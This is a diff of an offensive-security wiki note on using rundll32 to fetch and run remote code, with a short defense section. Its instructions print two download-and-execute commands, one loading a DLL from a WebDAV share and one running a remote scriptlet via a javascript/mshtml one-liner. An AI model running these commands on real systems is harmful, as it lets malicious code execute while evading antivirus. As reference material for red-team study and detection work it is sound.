@@ -35,11 +35,15 @@ Rundll32 can be used to execute code that is downloaded from the internet via We
 
 Rundll32 can be used to execute code that is downloaded from the internet via WebDAV or Remote Script Execution. This technique allows an attacker to bypass traditional security measures like firewalls and antivirus software. By using the rundll32 command, the attacker can execute code without having to write a file to disk, making detection more difficult. The business value of this attack is that it allows the attacker to gain a foothold in the target's system, which can be used to launch further attacks.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable system
 
 1. WebDAV or Remote Script Execution access
+
+ 
 
 ## Defense
 
@@ -49,17 +53,29 @@ Rundll32 can be used to execute code that is downloaded from the internet via We
 
 1. Keep systems and software up to date to prevent vulnerabilities that can be exploited by attackers.
 
+ 
+
 ## Objectives
 
 1. Download and execute malicious code on the target system
+
+ 
 
 # Instructions
 
 1. Execute a payload stored on a remote WebDAV server using rundll32.
 
+ 
+
+
+
 **Code**: [[rundll32 \\webdavserver\folder\payload.dll,entrypo]]
 
+
+
 > This command executes a malicious payload stored on a remote WebDAV server using the rundll32 utility. The command takes the path to the remote payload DLL file and the name of the entry point function as arguments. Once executed, the payload will run with the privileges of the current user. This technique can be used by an attacker to bypass traditional security measures such as antivirus software or firewalls, as the payload is not stored locally on the victim's machine.
+
+
 
 **Command** ([[Execute payload.dll entrypoint]]):
 
@@ -67,9 +83,17 @@ Rundll32 can be used to execute code that is downloaded from the internet via We
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```
 
+
+
 2. This command executes a remote script by running a JavaScript file on the target system using rundll32.exe. The script is downloaded from the specified web server and executed locally on the target system.
 
+ 
+
+
+
 **Code**: [[rundll32.exe javascript:"\..\mshtml,RunHTMLApplica]]
+
+
 
 > The 'rundll32.exe' command is used to execute DLL functions. In this case, it is used to execute a JavaScript file that is downloaded from a remote server. The 'javascript:"\..\mshtml,RunHTMLApplication"' argument is used to run the specified JavaScript file. The 'GetObject("script:http://webserver/payload.sct")' argument is used to download the script from the specified web server. Finally, the 'window.close()' argument is used to close the window after the script has been executed.
 
@@ -97,3 +121,5 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 
 - [[Rundll32]]
 - [[Windows - Download and execute methods]]
+
+
